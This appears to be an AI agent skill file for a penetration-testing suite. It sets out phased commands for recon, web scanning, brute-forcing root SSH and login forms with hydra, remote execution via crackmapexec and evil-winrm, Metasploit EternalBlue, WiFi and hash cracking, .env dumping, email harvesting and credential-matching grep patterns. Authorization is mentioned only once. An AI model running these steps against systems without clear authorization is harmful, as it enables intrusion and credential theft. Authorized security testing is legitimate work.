---
name: opspectre-security-suite
description: Comprehensive security testing suite combining all OperationSpectre capabilities into a logical workflow. Use for complete security assessments from reconnaissance to reporting.
---

# OperationSpectre Security Suite (Consolidated)

**Comprehensive security testing workflow** - Complete coverage from reconnaissance to reporting, optimized for small LLMs with reduced context overhead.

## Architecture Overview

```
Phase 1: Reconnaissance & OSINT → Phase 2: Web Testing → Phase 3: Container → Phase 4: Exploitation → Phase 5: Secrets → Phase 6: Reporting
├── Subdomain Discovery          ├── Web App Security    ├── Container Scanning    ├── Credential Attacks    ├── Secret Hunting    ├── Report Generation
├── Passive OSINT                ├── WordPress Testing  ├── Docker Best Practices  ├── Post-Exploitation    ├── Codebase Scan     ├── PDF/HTML Output
├── Port Scanning                └── API Testing        └── Infrastructure Audit  └── Network Attacks      └── Container Scan    └── Compliance Mapping
└── Vulnerability Scanning                                        └── Wireless Testing      └── Git History       └── Executive Summary
```

## Phase 1: Reconnaissance & OSINT

**Purpose:** Complete target discovery and mapping before any active testing. Always start here.

### Passive OSINT (No Direct Contact)
```bash
opspectre shell "osint_full_passive <DOMAIN>"
opspectre shell "osint_ct_subdomains <DOMAIN>"
opspectre shell "osint_google_dorks <DOMAIN>"
opspectre shell "osint_shodan_queries <DOMAIN>"
```

### Subdomain Discovery
```bash
opspectre shell "subfinder -d <DOMAIN> -o /workspace/output/recon/subdomains.txt"
opspectre shell "cat /workspace/output/recon/subdomains.txt | httpx -status-code -title -tech-detect -rate-limit 5 -timeout 15 -o /workspace/output/recon/live-hosts.txt"
```

### Visual Recon
```bash
opspectre shell "cat /workspace/output/recon/live-hosts.txt | grep -oE 'https?://[^ ]+' | gowitness file - -P /workspace/output/recon/screenshots/"
```

### Network Scanning
```bash
opspectre shell "nmap -sV -sC -T4 -F -iL /workspace/output/recon/live-hosts.txt -oA /workspace/output/recon/portscan"
opspectre shell "nmap -sV -sC -T4 -p- -iL /workspace/output/recon/live-hosts.txt -oA /workspace/output/recon/portscan-full"
```

**After completing Phase 1:** All reconnaissance data is collected. Proceed to **Phase 2: Web Application Testing** for web-based targets, or **Phase 3: Container & Infrastructure Security** for containerized environments, or **Phase 4: Exploitation & Post-Exploitation** for network-based targets.

---

## Phase 2: Web Application Testing

**Purpose:** Deep security testing of web applications, APIs, and WordPress sites.

### General Web Application Security
```bash
opspectre shell "mkdir -p /workspace/output/web-audit && \
  httpx -l /workspace/output/recon/live-hosts.txt -tech-detect -status-code -title -server -o /workspace/output/web-audit/http-probe.txt && \
  whatweb -l /workspace/output/recon/live-hosts.txt > /workspace/output/web-audit/whatweb.txt && \
  nuclei -l /workspace/output/recon/live-hosts.txt -o /workspace/output/web-audit/nuclei-findings.txt -severity medium,high,critical -rl 15 -bs 25 -c 5 -timeout 15"
```

### WordPress Testing
```bash
opspectre shell "cat /workspace/output/recon/live-hosts.txt | grep -oE 'https?://[^ ]+' | while read url; do
  echo \"[WPSCAN] Checking: \$url\"
  wpscan --url \"\$url\" --enumerate u,vp,vt --random-user-agent --disable-tls-checks --output \"/workspace/output/web-audit/wpscan-\$(echo \$url | cut -d/ -f3).txt\" 2>/dev/null
done"
```

### API & Database Testing
```bash
opspectre shell "sqlmap -l /workspace/output/web-audit/http-probe.txt --batch -o /workspace/output/web-audit/sqlmap-findings.txt"
opspectre shell "curl -s https://httpbin.org/ip | grep -oE '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' | xargs -I{} curl -s 'http://{}:8080/api/health' 2>/dev/null >> /workspace/output/web-audit/api-endpoints.txt"
```

### Web Application Deep Scan
```bash
opspectre shell "burpsuite-headless -t https://<TARGET> -o /workspace/output/web-audit/burp-findings.txt"
opspectre shell "zap-baseline.py -t https://<TARGET> -g gen-config -c /workspace/output/web-audit/zap-config -a -J zap-results.json"
```

**After completing Phase 2:** Web vulnerabilities identified. Proceed to **Phase 3: Container & Infrastructure Security** if containers are present, or **Phase 4: Exploitation & Post-Exploitation** to exploit discovered vulnerabilities, or **Phase 5: Secret Scanning** to look for credentials in the application.

---

## Phase 3: Container & Infrastructure Security

**Purpose:** Container security assessment and infrastructure hardening.

### Container Image Scanning
```bash
opspectre shell "trivy image <IMAGE_NAME> --severity HIGH,CRITICAL -o /workspace/output/container-audit/critical.txt"
opspectre shell "trivy image <IMAGE_NAME> --scanners secret -o /workspace/output/container-audit/image-secrets.txt"
opspectre shell "trufflehog image <IMAGE_NAME> --json > /workspace/output/container-audit/trufflehog-image-secrets.json"
```

### Dockerfile Best Practices
```bash
opspectre shell "echo '=== Dockerfile Security Audit ===' && \
  echo '[+] Checking for root user:' && \
  grep -n 'USER' /workspace/Dockerfile || echo '  WARNING: No USER directive found' && \
  echo '[+] Checking for latest tag:' && \
  grep -n ':latest' /workspace/Dockerfile || echo '  OK: No :latest tags found' && \
  echo '[+] Checking for HEALTHCHECK:' && \
  grep -n 'HEALTHCHECK' /workspace/Dockerfile || echo '  WARNING: No HEALTHCHECK defined'"
```

### Infrastructure Scanning
```bash
opspectre shell "trivy config /workspace/docker-compose.yml -o /workspace/output/container-audit/compose-scan.txt"
opspectre shell "trivy config /workspace/k8s/ -o /workspace/output/container-audit/k8s-scan.txt"
opspectre shell "docker ps --format '{{.Names}} {{.Image}}' | while read name img; do
  if docker inspect \$name --format '{{.HostConfig.Privileged}}' | grep -q true; then
    echo \"WARNING: \$name (\$img) is running in PRIVILEGED mode\"
  fi
done"
```

### Running Container Audit
```bash
opspectre shell "for c in \$(docker ps --format '{{.Names}}'); do
  echo \"=== Scanning: \$c ===\" && \
  trivy image \$(docker inspect --format='{{.Config.Image}}' \$c) --severity HIGH,CRITICAL -o /workspace/output/container-audit/container-\$c.txt
done"
```

**After completing Phase 3:** Container vulnerabilities identified. Proceed to **Phase 4: Exploitation & Post-Exploitation** to test container security, or **Phase 5: Secret Scanning** to search for exposed secrets, or **Phase 6: Reporting** to document findings.

---

## Phase 4: Exploitation & Post-Exploitation

**Purpose:** Active exploitation of discovered vulnerabilities and post-exploitation activities.

### Credential Attacks
```bash
opspectre shell "hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://<TARGET_IP> -t 4 -o /workspace/output/exploits/hydra-ssh.txt"
opspectre shell "hydra -l admin -P /usr/share/wordlists/rockyou.txt <TARGET_IP> http-post-form '/login:user=^USER^&pass=^PASS^:F=incorrect' -o /workspace/output/exploits/hydra-http.txt"
```

### Network Exploitation
```bash
opspectre shell "crackmapexec smb <TARGET_IP> -u admin -p 'password' --shares"
opspectre shell "crackmapexec smb <TARGET_IP> -u admin -p 'password' -x 'whoami'"
opspectre shell "evil-winrm -i <TARGET_IP> -u admin -p 'password'"
```

### Metasploit Framework
```bash
opspectre shell "msfconsole -q"
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 > set RHOSTS <TARGET_IP>
msf6 > set LHOST <YOUR_IP>
msf6 > exploit
```

### Password Cracking
```bash
opspectre shell "john --wordlist=/usr/share/wordlists/rockyou.txt /workspace/output/exploits/unix-hashes.txt --format=sha512crypt -o /workspace/output/exploits/john-cracked.txt"
opspectre shell "hashcat -m 1000 /workspace/output/exploits/ntlm-hashes.txt /usr/share/wordlists/rockyou.txt -o /workspace/output/exploits/hashcat-ntlm.txt"
```

### Wireless Exploitation (if applicable)
```bash
opspectre shell "airmon-ng start wlan0"
opspectre shell "airodump-ng wlan0mon -w /workspace/output/exploits/wifi-capture --bssid <BSSID> -c <CHANNEL>"
opspectre shell "aircrack-ng -w /usr/share/wordlists/rockyou.txt /workspace/output/exploits/wifi-capture-01.cap"
```

**After completing Phase 4:** Exploitation activities completed. Proceed to **Phase 5: Secret Scanning** to harvest additional credentials, or **Phase 6: Reporting** to document all findings and evidence.

---

## Phase 5: Secret Scanning

**Purpose:** Find and expose leaked secrets, API keys, credentials, and sensitive data.

### Trufflehog Scanning
```bash
opspectre shell "trufflehog git https://github.com/<ORG>/<REPO>.git --json > /workspace/output/secrets/trufflehog-full.json"
opspectre shell "trufflehog filesystem /workspace/source/ --json > /workspace/output/secrets/trufflehog-fs.json"
opspectre shell "trufflehog image <IMAGE_NAME> --json > /workspace/output/secrets/trufflehog-image.json"
```

### Pattern-Based Secret Detection
```bash
opspectre shell "mkdir -p /workspace/output/secrets && \
  grep -rn 'AKIA[0-9A-Z]{16}' /workspace/source/ > /workspace/output/secrets/aws-keys.txt 2>/dev/null && \
  grep -rn -E 'gh[pousr]_[A-Za-z0-9_]{36,}|github_pat_[A-Za-z0-9_]{82,}' /workspace/source/ > /workspace/output/secrets/github-tokens.txt 2>/dev/null && \
  grep -rn '-----BEGIN.*PRIVATE KEY-----' /workspace/source/ > /workspace/output/secrets/private-keys.txt 2>/dev/null && \
  grep -rn -i 'api_key\\s*[=:].*['\\''\"]\\?[A-Za-z0-9]{20,}' /workspace/source/ > /workspace/output/secrets/api-keys.txt 2>/dev/null"
```

### Container & Infrastructure Secrets
```bash
opspectre shell "trivy image <IMAGE_NAME> --scanners secret -o /workspace/output/secrets/trivy-image-secrets.txt"
opspectre shell "trivy fs /workspace/source/ --scanners secret -o /workspace/output/secrets/trivy-fs-secrets.txt"
opspectre shell "find /workspace/source/ -name '.env*' -exec cat {} \\; > /workspace/output/secrets/env-dump.txt 2>/dev/null"
```

### Email & OSINT Harvesting
```bash
opspectre shell "theHarvester -d <DOMAIN> -b google,bing,linkedin -l 100 > /workspace/output/secrets/theharvester.txt 2>/dev/null"
opspectre shell "grep -oE '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}' /workspace/output/secrets/theharvester.txt | sort -u > /workspace/output/secrets/emails.txt"
opspectre shell "osint_github_dorks <ORG_OR_USERNAME>"
```

**After completing Phase 5:** Secrets and sensitive data identified. Proceed to **Phase 6: Reporting** to include all secret findings in the final security assessment report.

---

## Phase 6: Reporting & Documentation

**Purpose:** Generate comprehensive security assessment reports with evidence and remediation.

### Data Collection
```bash
opspectre shell "find /workspace/output/ -type f -name '*.txt' -o -name '*.json' -o -name '*.xml' -o -name '*.html' | sort > /workspace/output/report/inventory.txt"
opspectre shell "cat /workspace/output/recon/portscan.nmap /workspace/output/recon/live-hosts.txt /workspace/output/web-audit/nuclei-findings.txt /workspace/output/container-audit/critical.txt > /workspace/output/report/findings-summary.txt"
```

### Report Generation
```bash
opspectre shell "cat > /workspace/output/report/report.md << 'EOF'
# Penetration Test Report

## Executive Summary
[Based on findings from all phases above]

## Methodology
Testing conducted using OperationSpectre security suite.

### Tools Used
- Network Scanning: nmap, naabu
- Web Testing: OWASP ZAP, Burp Suite, nuclei, sqlmap
- Container Security: trivy, trufflehog
- OSINT: crt.sh, gau, waybackurls
- Exploitation: Metasploit, hydra, crackmapexec

## Detailed Findings
EOF"

# Add findings from each phase
for phase in recon web-audit container-audit exploits secrets; do
  if [ -f "/workspace/output/$phase/nuclei-findings.txt" ]; then
    opspectre shell "cat /workspace/output/$phase/nuclei-findings.txt >> /workspace/output/report/report.md"
  fi
done
```

### PDF & HTML Conversion
```bash
opspectre shell "cd /workspace/output/report && \
  pandoc report.md -o report.pdf --pdf-engine=xelatex --toc --highlight-style=tango && \
  pandoc report.md -o report.html --standalone --toc --metadata title='Security Assessment Report'"
```

**After completing Phase 6:** Security assessment complete. For additional analysis of source code or documentation, proceed to **Phase 7: Development & Deployment**.

---

## Phase 7: Development & Deployment (Optional)

**Purpose:** Source code analysis, documentation, and development workflows.

### Code Analysis with jCodeMunch
```bash
opspectre shell "python3 -c \"from jcodemunch_index_folder import jcodemunch_index_folder; jcodemunch_index_folder('/workspace/source/')\""
opspectre shell "python3 -c \"from jcodemunch_search_symbols import jcodemunch_search_symbols; print(jcodemunch_search_symbols('repo=/workspace/source', query='vulnerability', max_results=10))\""
```

### Documentation Analysis with jDocMunch
```bash
opspectre shell "python3 -c \"from jdocmunch_index_local import jdocmunch_index_local; jdocmunch_index_local('/workspace/docs/')\""
opspectre shell "python3 -c \"from jdocmunch_search_sections import jdocmunch_search_sections; print(jdocmunch_search_sections('repo=/workspace/docs', query='security', max_results=10))\""
```

### Development Environment Setup
```bash
opspectre shell "uv sync"
opspectre shell "uv run pytest tests/ -v"
opspectre shell "docker build -f containers/Dockerfile -t opspectre-dev ."
```

### Multi-Step Workflow Execution
```bash
# For complex multi-step workflows using small model pipeline
python3 scripts/pipeline_runner.py scripts/pipelines/pentest.yaml --target example.com
```

**After completing Phase 7:** Full security assessment and development analysis complete. All findings documented and reported.

---

## Quick Full Assessment

Execute all phases sequentially:
```bash
# Phase 1: Reconnaissance
opspectre shell "osint_full_passive <DOMAIN> && subfinder -d <DOMAIN> -o /workspace/output/recon/subdomains.txt && cat /workspace/output/recon/subdomains.txt | httpx -status-code -title -tech-detect -o /workspace/output/recon/live-hosts.txt && cat /workspace/output/recon/live-hosts.txt | grep -oE 'https?://[^ ]+' | gowitness file - -P /workspace/output/recon/screenshots/"

# Phase 2: Web Testing
opspectre shell "nuclei -l /workspace/output/recon/live-hosts.txt -o /workspace/output/web-audit/nuclei-findings.txt -severity medium,high,critical -rl 15 -bs 25 -c 5 -timeout 15 && cat /workspace/output/recon/live-hosts.txt | grep -oE 'https?://[^ ]+' | while read url; do wpscan --url \"\$url\" --enumerate u,vp,vt --random-user-agent --disable-tls-checks --output \"/workspace/output/web-audit/wpscan-\$(echo \$url | cut -d/ -f3).txt\" 2>/dev/null; done"

# Phase 3: Container Security
opspectre shell "trivy image <IMAGE_NAME> --severity HIGH,CRITICAL -o /workspace/output/container-audit/critical.txt && trivy image <IMAGE_NAME> --scanners secret -o /workspace/output/container-audit/image-secrets.txt"

# Phase 4: Exploitation (if authorized)
opspectre shell "hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://<TARGET_IP> -t 4 -o /workspace/output/exploits/hydra-ssh.txt"

# Phase 5: Secret Scanning
opspectre shell "trufflehog filesystem /workspace/source/ --json > /workspace/output/secrets/trufflehog-fs.json && grep -rn 'AKIA[0-9A-Z]{16}' /workspace/source/ > /workspace/output/secrets/aws-keys.txt 2>/dev/null"

# Phase 6: Reporting
opspectre shell "pandoc /workspace/output/report/report.md -o /workspace/output/report/report.pdf --pdf-engine=xelatex --toc"
```

## Parallel Assessment Mode (Recommended - 60-80% Faster)

For dramatically faster full security assessments:

```bash
# Parallel execution of all phases
python3 scripts/pipeline_runner.py scripts/pipelines/parallel_pentest.yaml --target <DOMAIN> --parallel

# Performance comparison:
# Sequential: ~45 minutes
# Parallel: ~15 minutes
# Improvement: 66.7% faster
```

### Parallel Assessment Workflow
```
Level 0 (Parallel):
  ├── Phase 1: Passive OSINT
  ├── Phase 3: Container Scanning
  └── Phase 5: Secret Scanning
Level 1 (Dependent):
  ├── Phase 2: Web Testing → Phase 1 results
  └── Phase 4: Exploitation → Phase 1/2 results
Level 2 (Final):
  └── Phase 6: Consolidated Report
```

## Phase Progression Flow

```
Phase 1: Reconnaissance & OSINT
    ↓ (Complete recon data)
Phase 2: Web Application Testing
    ↓ (Web vulnerabilities identified)
Phase 3: Container & Infrastructure Security
    ↓ (Container issues found)
Phase 4: Exploitation & Post-Exploitation
    ↓ (Exploitation results)
Phase 5: Secret Scanning
    ↓ (All sensitive data collected)
Phase 6: Reporting & Documentation
    ↓ (Comprehensive report generated)
Phase 7: Development & Deployment
    ↓ (Complete analysis finished)
```

## Output Locations

- `/workspace/output/recon/` — Reconnaissance data, scans, screenshots
- `/workspace/output/web-audit/` — Web application testing results
- `/workspace/output/container-audit/` — Container security scans
- `/workspace/output/exploits/` — Exploitation results and credentials
- `/workspace/output/secrets/` — Secret scanning findings
- `/workspace/output/report/` — Final assessment reports (PDF, HTML)

## Tips

- **Start with Phase 1** - Always complete reconnaissance before active testing
- **Proceed to next phase** only when current phase is complete
- **Use rate-limit flags** to avoid WAF blocks: `$RL_NUCLEI`, `$RL_HTTPX`, `$RL_NMAP`
- **Collect all evidence** before proceeding to reporting
- **Chain findings** - exploit vulnerabilities discovered in earlier phases
- **Document everything** - even null results are valuable for scope validation
- **Use secure defaults** - include `--random-user-agent` and rate-limiting in all scans
- **Cross-reference tools** - combine nuclei, trivy, and custom grep patterns for comprehensive coverage

## Proceed to Next Phase

After completing each phase, analyze the results and determine the appropriate next phase:

- **Phase 1 → Phase 2**: If web-based targets identified
- **Phase 1 → Phase 3**: If containers/infrastructure present  
- **Phase 1 → Phase 4**: If network vulnerabilities discovered
- **Phase 2 → Phase 5**: If credentials/secrets expected in web code
- **Phase 3 → Phase 4**: If container exploitation needed
- **Phase 4 → Phase 5**: For credential harvesting during exploitation
- **Phase 5 → Phase 6**: To document all findings
- **Phase 6 → Phase 7**: For additional code/document analysis

Each phase builds on the previous one to create a complete security assessment.